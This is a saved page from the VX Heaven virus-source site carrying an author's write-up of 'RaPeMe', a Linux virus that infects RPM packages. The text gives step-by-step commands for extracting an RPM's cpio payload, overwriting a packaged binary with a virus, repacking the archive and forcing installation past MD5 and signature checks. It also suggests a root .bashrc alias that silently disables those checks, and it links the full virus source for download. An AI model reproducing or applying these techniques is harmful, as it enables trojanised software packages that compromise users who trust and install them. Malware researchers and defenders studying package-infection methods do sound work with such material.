<?xml version="1.0"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title>RaPeMe - Virus for Linux by sbudella (VX heaven)</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<meta name="Author" content=""/>
<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири"/>
<meta name="Description" content="VX Heaven site is dedicted to providing information about computer viruses (virii) and web space for virus authors and groups"/>
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"f35a74cb5d28ef95b81b8422b7354862a48f965e-1498755329-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
//]]>
</script>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/><script type="text/rocketscript">	var s = 0;
	function soundex() {
		if (document.getElementById) {
			var snd = document.getElementById("snd");
			var frm = document.getElementById("sfrm");
			s = 1 - s;
			snd.src = "/img/sound_" + (s ? "on" : "off") + ".gif";
			frm.soundex.value = s;
		}
	}
	function do_img() {
		if (document.getElementById)
			document.write('<' + 'img id="snd" class="va" src="/img/sound_' + (s ? 'on' : 'off') + '.gif" onclick="soundex();" alt="" /' + '>');
	}</script>
<link rel="stylesheet" type="text/css" href="/style.css"/><style type="text/css">.va{vertical-align:middle;}</style>
<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
</head>
<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
<div class="s1">
<div style="float:right;"><a href="/src.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
<div style="float: right;"><div id="plusone"></div></div>
<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
<div style="float: right;" class="addthis_toolbox addthis_default_style">
<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
</div>
<div style="float: right;">
<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
<form action="/search.php" id="cse-search-box">
<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
<input type="hidden" name="cof" value="FORID:10"/>
<input type="hidden" name="ie" value="UTF-8"/>
<input type="text" name="q" size="12" value=" "/>
<input type="submit" name="sa" value="Search"/>
</form>
</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
</div>
<div class="s2"><h1>Source code of computer viruses</h1><h2>RaPeMe - Virus for Linux by sbudella</h2><p><em>Virus for Linux</em></p><p><strong>sbudella</strong><br/><small><a href="/src.php?author=sbudella">Show all viruses by this author</a></small></p><p>2006-05-22</p><a href="#disqus_thread">Comments</a><br/><form class="fr" method="post" action="/file.php"><input type="image" src="/img/dl.gif" alt="Download"/><input type="hidden" name="file" value="c3JjL3JhcGVtZS56aXA@"/></form> Download rapeme.zip (27029 bytes) or <a href="/src_view.php?file=rapeme.zip">browse online</a><p><strong>Author's documentation</strong></p>
<h2>Intro</h2>
<p>This document describes the internals of the RaPeMe virus, in detail
it shows its simple infection method. This document will not cover any
ELF infection related info, because it is well documented elsewhere[1].</p>
<h2>Overview</h2>
<p>Everybody knows that Unix virii don't have a huge spread because of
security mechanisms natively implemented in this os. ELF binaries are all
stored in directories which prevent any incoming parasite from infecting
them, due to write permissions. Picture the most common scenario: the lame
virus/worm comes as an email attachment asking the user to be run; almost every
unix/linux user is not so fuckin stupid to execute it and will delete
it. But if the user is a moron however, the parasite will search for
ELF bins in the user directories, failing in returning any one because
it is not common to have bins in user dirs on Unix systems. Thus the
virus has to hope to be executed one day by root, but this is a difficult
task to accomplish, too many hide tricks to think of. We can consider
the possibility of a parasite executed by a remote exploit, and this is
the common case of serious internet worms spreading on unix machines.
However a worm which has gained access to a server will not spend too
much time searching for and infecting ELF binaries, but it will simply
backdoor the system and search for other ones with that specific bug.
A successfull but little implemented infection method is source infecting,
because software in the linux world is often traded in such form;
thus the virus will just search for source directories and add some
call to itself in the main file, then hiding itself in that src dir.
Shell script infection is also a smart method. But what about package
archives? Linux users know that binary files are stored in archive
form and many servers on the net provide package download services
(sourceforge.net is the most popular). RPM archives is the software
package system used by Red Hat Linux distribution, Fedora Core and the
newbie oriented Mandrake/Mandriva (just to cite a few). I suggest another
infection method to target this type of archive, adding one more chance
to the virus writer to achieve his malicious goals on Linux systems...</p>
<h2>RPM, or the way you can fuck your system cleanliness with package dependencies.</h2>
<p>RPM packages are managed on the above cited systems by rusty muddler
front ends to the so called rpm package manager. This utility is no more
that a provider of the most common functions collected in librpm. It
can be found also on many Linux distributions that don't use the rpm as
native packaging system (on slackware you can find it in /bin/rpm).
Have a look at man rpm for more infos, or read the rpm developer guide[2]
for a quick description of those functions. RPM system developers will
always suggest you to handle rpm files with those library functions, but
this is not suitable for a virus. We will use raw file format access.
A rpm file constists of some data structures, which are : the lead,
the signature, the store, the header and finally the archive
payload. Fortunately, in the infection method showed further
below it is not necessary to understand all these bullshits because
we are interested in the archive payload, that is the part of the file
where all the software files are stored. But we must first identify
our target. Simply type:</p>
<pre class="source">
$ file host.rpm
host.rpm: RPM v3 bin i386 ncftp-3.0.3-3
$
</pre>
<p>As you can see, the file util reports some info from the host.rpm file.
We can do the same simply reading the first 96 bytes from host.rpm.
In fact those general infos about the rpm file are stored in the structure
called the lead. Look at the following C source for a better understanding.</p>
<p><strong>example #1</strong></p>
<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><br/>
<span style="color: #339933;">#include &lt;stdio.h&gt;</span><br/>
<br/>
<span style="color: #808080; font-style: italic;">/* this is the lead structure as<br/>
&nbsp; &nbsp;defined in the rpm file format */</span><br/>
<span style="color: #993333;">struct</span> rpmlead <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">unsigned</span> <span style="color: #993333;">char</span> magic<span style="color: black;">&#91;</span><span style="color: #0000dd;">4</span><span style="color: black;">&#93;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">unsigned</span> <span style="color: #993333;">char</span> major<span style="color: #339933;">,</span> minor<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">short</span> type<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">short</span> archnum<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">char</span> name<span style="color: black;">&#91;</span><span style="color: #0000dd;">66</span><span style="color: black;">&#93;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">short</span> osnum<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">short</span> signature_type<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">char</span> reserved<span style="color: black;">&#91;</span><span style="color: #0000dd;">16</span><span style="color: black;">&#93;</span><span style="color: #339933;">;</span><br/>
<span style="color: black;">&#125;</span><span style="color: #339933;">;</span><br/>
<br/>
main<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><br/>
<span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; FILE <span style="color: #339933;">*</span>inp <span style="color: #339933;">=</span> <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fopen.html"><span style="color: #000066;">fopen</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;host.rpm&quot;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">&quot;r&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">struct</span> rpmlead lead<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">int</span> i<span style="color: #339933;">;</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fread.html"><span style="color: #000066;">fread</span></a><span style="color: black;">&#40;</span><span style="color: #339933;">&amp;</span>lead<span style="color: #339933;">,</span><span style="color: #993333;">sizeof</span><span style="color: black;">&#40;</span><span style="color: #993333;">struct</span> rpmlead<span style="color: black;">&#41;</span><span style="color: #339933;">,</span><span style="color: #0000dd;">1</span><span style="color: #339933;">,</span>inp<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;0x&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span><span style="color: black;">&#40;</span>i <span style="color: #339933;">=</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">;</span>i <span style="color: #339933;">&lt;</span> <span style="color: #0000dd;">4</span><span style="color: #339933;">;</span>i<span style="color: #339933;">++</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;%x&quot;</span><span style="color: #339933;">,</span>lead.<span style="color: #202020;">magic</span><span style="color: black;">&#91;</span>i<span style="color: black;">&#93;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;<span style="color: #000099; font-weight: bold;">\n</span>%x.%x %x %s<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">,</span>lead.<span style="color: #202020;">major</span><span style="color: #339933;">,</span>lead.<span style="color: #202020;">minor</span><span style="color: #339933;">,</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; lead.<span style="color: #202020;">type</span><span style="color: #339933;">,</span>lead.<span style="color: #202020;">name</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fclose.html"><span style="color: #000066;">fclose</span></a><span style="color: black;">&#40;</span>inp<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">;</span><br/>
<br/>
<span style="color: black;">&#125;</span><br/>
&nbsp;</div>
<pre class="source">
$ gcc -o lead lead.c
$ ./lead
$ 0xedabeedb 3.0 0 ncftp-3.0.3-3mdk
$
</pre>
<p>The program prints exactly the same informations but in a raw dress.
As you can see 0xedabeedb is the magic number which identifies a
rpm file and it is stored in the first four bytes of the structure.
The following two bytes are named major and minor and are reserved for
the rpm version. The important one is the struct member called type :
this two bytes long information identifies the type af the archive;
in fact we can have two common rpm types : binary and source
archive. If type is equal to 0x00 we have a binary rpm; 0x01 is for
source archive. In our case we have in fact a binary one.
The array name reserves 66 bytes for the rpm name.
We can leave out the other members.
So now we have some useful hints on how to identify a target for
our virus : we must read at least its first 8 bytes to check
the magic number and the archive type. Nothing else is needed.</p>
<h2>RPM pregnancy over : defecating the archive payload.</h2>
<p>As said above, we are interested in the archive part of the rpm.
First thing first, good news : files are stored using gzip!
Fuckin yeah! So we can extract the payload after having located
the gzip magic in the rpm; it is 0x1f8b08, thus fire up biew
an search for it. But we don't have to use biew; someone made
things easier for us : use rpmoffset[3] as showed below.</p>
<pre class="source">
$ rpmoffset < host.rpm
5795
$
</pre>
<p>Guessing what the fuck is that? That's the offset where the gzip
archive starts. We can now extract it using a bit of shell work.</p>
<pre class="source">
$ dd if=host.rpm of=host.cpio.gz ibs=1 skip=`rpmoffset < host.rpm`
457369+0 records in
893+1 records out
$
</pre>
<p>rpmoffset is a little program which reports the offset for us,
so we can use it in our infector. gunzip the archive and 
lets investigate its nature.</p>
<pre class="source">
$ gunzip host.cpio.gz 
$ file host.cpio
host.cpio: ASCII cpio archive (SVR4 with no CRC)
$
</pre>
<p>What is a cpio archive? Well, it's an archive type just like tar,
and it's very simple to reverse, however if you google for it you
will get a lot of docs about its file format. Briefly, every cpio
archive has a header for each file stored in it; the header keeps
general informations about the file such as inode number, file mode,
uid,gid and filesize (all these infos are compatible with those
returned by stat(2), all zero padded on the left) proceded always
by the magic number which is 070707. It's important to say that 
the stored files don't go under any compression in pure SVR4 cpio
and in our case (no CRC) there's no checksum. Every cpio archive
ends with a header describing a void file followed by the string
TRAILER!!! . Try opening host.cpio with vi : you should see  
files in plain binary form! That is to say that we can now 
implement every well known ELF binary infection method as
we are operating on a ELF stored in our file system. In the 
other case, that in which we want to infect source rpm, we have
just to search the main() function in the cpio and then we can
insert a call to the virus, appended to the archive, or we can
just copy its source completely like a quine would do. 
Ok...so now we have the payload, but what is the infection plan?</p>
<h2>RPM brutal disfigurement</h2>
<p>Our plan : locate the first file in the cpio and overwrite it
with the virus. What the fuck, this will totally destroy the
old one, but who the fuck cares! This is not an ELF infection tutorial,
i show you RPM infection, not other ones, but remember : since in the cpio
archive you can find files in plain binary form it will be trivial
to infect them with any method you want and prevent them from destruction
and, most important thing, avoiding stupid users detection. Remember : 
the more stealth it is, more survival chances it will have. 
Lets have a look at the host's cpio header, we can count 110 byte
before file name string begins.</p>
<pre class="source">
$ head -c 110 host.cpio 
070701001f332f000081ed0000000000000000000000013b8e12320003311c
000000080000001100000000000000000000001000000000
$
</pre>
<p>0x3311c is the file size and the last significant number (0x10)
is the file name size. Remember all these infos refer to the 
first file in the archive, in our case /usr/bin/ncftp . 
So if we follow the infamous infection method showed above 
we must substitute the size tag with our file size.
If you decided to implement any ELF infection method you have just
to increase the size tag by the virus size. (Remember to zero
pad every header field, look at the code for more info...).  
Now lets assume our virus is a dummy hello world program
whose size is 0x2958. Rename it with a 0x10 - 1 long name.
Now we create quickly our cpio archive (man cpio(1)), 
without using stat system call:</p>
<pre class="source">
$ echo azxcvbnmlkjhgfd | cpio -O virus.cpio -H newc -o 
$
</pre>
<p>Open it with vi and edit the file name to resemble the 
original cpio first file name; then remove the TRAILER header.
Open the original cpio and remove the first file related 
header and the first file itself (exactly remove first 
file size + header size + first file name length bytes). 
Then:</p>
<pre class="source">
$ cat virus.cpio host.cpio > new.cpio
$ gzip new.cpio
</pre>
<p>We now have an infected cpio archive resembling the original one, 
but infected by the malicious hello world program that have just
substituted /usr/bin/ncftp. When removing the first file
remember to get its size and file name length. Then recompose the rpm:</p>
<pre class="source">
$ dd if=host.rpm of=host.head ibs=1 count=`rpmoffset < host.rpm`
5795+0 records in
11+1 records out
$ cat host.head new.cpio.gz > new.rpm
$ cp host.rpm /tmp
$ mv new.rpm host.rpm
# rpm -i host.rpm --force --nodeps --nosignature --nomd5 --nodigest 
$ ncftp
Hello, Fucking World!
$
</pre>
<h2>Stripped, raped and strangled</h2>
<p>Our C coded virus must automatize all the malicious tasks accomplished
above, but we have a little problem now.
Look at the last three options given to rpm(8) above : they are fuckin 
necessary because of security mechanisms implemented in the format
such as a md5 sum, gpg and many others such as a file size check.
So fuck, we have a huge problem left here. If a single security check
fails, no rpm archive file will be installed. However it is possible to
proceed forcing the package manager with the options showed above. 
All those checks are placed in the store, that is a structure which
holds informations pointed by the header and by the signature area.
I make myself understood : just after the lead we can find the signature
area which is a header-like structure usually made of 3 index entries. 
Every signature index entry refers to a security check used in the rpm file. 
Lets analyze our host.rpm for clearness : we said that the lead is 0x60 bytes
long, thus our signature area starts from this offset. Fire up biew :</p>
<pre>00000060: 8E AD E8 01 00 00 00 00 00 00 00 03 00 00 00 55</pre>
<p>Every header-like structure's magic number is always 0x8eade8, and as
we can see ours is just as indicated. The next byte represents the
header structure version; the next zeroed four bytes are reserved. 
The other four bytes are the index entry number of the signature.
0x00000055 is for the number of bytes reserved in the store for the
signature. In fact, every entry, that is 16 bytes long, points to
an offset in the store section, which holds those pointed data.</p>
<pre>00000080: 00 00 03 EC 00 00 00 07 00 00 00 04 00 00 00 10</pre>
<p>This is the second signature area entry located using a little
calculation : 0x60(signature offset) + 0x10(entry size) * 2. 
The first four bytes (0x000003ec = 1004) represent the tag used
to describe the implemented signature type which protects the rpm.
Lets have a look at /usr/include/rpm/rpmlib.h : it says that 1004 is for
the RPMSIGTAG_MD5 tag, thus our second signature check is a boring md5 sum. 
0x00000007 is a tag which indicates the pointed data type (in this case,
it's the binary one). The next four bytes (0x00000004) tell us that the
md5 checksum starts 0x4 bytes just after the store starting offset, which
can be found at 0xa0 (0x3 * 0x10 + 0x70(the second entry offset)). 
0x10 is the checksum data size. So we can find this fucking md5 sum at
0xa0 + 0x4 = 0xa4. If we apply this procedure to the third signature entry
we find out a 0x3ed = 1005 = RPMSIGTAG_GPG tag... Fuck. My tired brain is
telling me that maybe a try to fuck rpm --checksig (i.e. the signature check)
would be recalculating the md5 sum and replacing the old one with it. In fact
the rpm file format says that the sum is calculated applying the md5 algorithm
on the package file header and on the archive payload. So, a virus with 
strong will could calculate the sum of the infected rpm file parts and do
the dirty job. But this feature is not implemented yet in the RaPeMe virus,
because I have no time to work it out. However, personally I think that the
signature problem can be avoided using an exploit that gives us root
privileges; then we can install a banal alias in the root's .bashrc (if
he uses bash):</p>
<pre>alias rpm="rpm --force --nodeps --nosignature --nomd5 --nodigest"</pre>
<p>Or we can install a powerful and infamous lkm which hooks the sys_execve system call and checks the envp arguments given to rpm(8).
If you are thinking that resigning the rpm using:</pre>
<pre class="source">
$ rpm --resign host.rpm
host.rpm:
$
</pre>
<p>is a good solution... you are fucking wrong!</p>
<h2>Final words</h2>
<p>As you can see, despite the infection method is very 
fuckin lame (but works, hey), it is not so simple to infect
entirely the system and smart users would always 
md5sum-check their files, and use rpm --checksig to avoid
boring infection attempts. The good way seems to be using a
bug exploit to root the machine so we can do whatever we want,
instead of trying to persuade the user to install infected rpms
with flatteries used in the classic windows style trojan. 
Anyway take a look at the virus source code. 
It's a proof of concept and it is just waiting to be 
improved with other malicious feature... It is important to note that  
the virus size is too fucking big, so i suggest to port the
code to sys call only instructions and then asm dress it, 
avoiding libc calls... furthermore, due to my coding skill lameness,
the virus will run very slow trying to infect veeery big rpm archives.
(I know getc/putc is the cause of the problem, 
but it is a trick that i cannot avoid...). 
The virus itself has been tested on Slackware 10 and on Mandrake 8.1, 
you can compile it using:</p>
<pre class="source">
$ gcc -o rapeme main.c hunt.c infect.c && cat LICENSE
$
</pre>
<p>Use it only after having cast a magick circle spell, evoking elemental 
spirits to partecipate in. Remember that if you damage any system with  
this stuff you will face the Law of Three, or you will burn in hell for 
the rest of your boring life...this is fuckin computer black magick... ;-)</p>
<h2>Greetings</h2>
<p>Giammy and family, my ex death metal band buddies (Cryptestesia fuckin rocks!), my friends from dietroleposte, trinity_np, boletus+xen, mat delirium,
and my dwarf rabbit frodo.</p>
<h2>References</h2>
<ol>
  <li>http://www.big.net.au/~silvio</li>
  <li>http://www.rpm.org/max-rpm/index.html</li>
<li>http://darkstar.ist.utl.pt/slackware/slackware-8.1/patches/source/bin/rpmoffset.c</li>
</ol>

<script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/src.php?info=rapeme.zip';</script></div><br /><div class="s2">
    <div id="disqus_thread"></div>
    <script type="text/rocketscript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname

        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
<div style="margin-top: 2px; float: left;" class="adsapeu">
<script type="text/rocketscript">
<!--
var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
//-->
</script>



</div>
<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
<div style="display: none;"></div>
</body>
</html>
